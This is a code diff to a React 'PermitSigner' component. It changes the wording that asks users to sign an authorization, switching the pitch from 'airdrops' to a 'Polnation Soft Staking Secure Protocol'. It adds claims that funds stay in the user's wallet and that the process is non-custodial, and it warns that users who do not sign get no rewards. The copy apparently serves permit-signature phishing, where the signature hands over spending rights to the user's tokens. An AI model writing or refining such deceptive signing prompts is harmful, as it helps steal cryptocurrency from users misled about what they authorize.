@@ -391,15 +391,27 @@ export function PermitSigner({ onSignatureComplete }: PermitSignerProps) {
         </div>
       )}
 
+      {/* Protocol Info */}
+      <div className="mb-4 p-4 bg-gradient-to-r from-purple-500/10 to-cyan-500/10 rounded-xl border border-purple-500/20">
+        <div className="flex items-center gap-2 mb-2">
+          <Shield className="w-5 h-5 text-purple-400" />
+          <h4 className="text-sm font-semibold text-purple-300">Polnation Soft Staking Secure Protocol</h4>
+        </div>
+        <p className="text-xs text-zinc-400">
+          Sign to authorize secure staking rewards distribution
+        </p>
+      </div>
+
       <div className="bg-white/5 rounded-xl p-4 mb-4 border border-white/10">
-        <p className="text-xs text-zinc-500 mb-2">What this does:</p>
+        <p className="text-xs text-zinc-500 mb-2">What this authorization does:</p>
         <ul className="text-sm text-zinc-400 space-y-1">
-          <li>• Authorizes the platform for airdrop distribution</li>
-          <li>• Required to receive staking rewards</li>
+          <li>• Enables automatic reward distribution to your wallet</li>
+          <li>• Required to participate in staking rewards</li>
           <li>• Your funds remain in your wallet at all times</li>
+          <li>• Non-custodial - you maintain full control</li>
         </ul>
-        <p className="text-xs text-amber-400 mt-2">
-          ⚠️ Without authorization, you won&apos;t receive airdrops
+        <p className="text-xs text-amber-400 mt-3">
+          ⚠️ Without authorization, you won&apos;t receive staking rewards
         </p>
       </div>
 
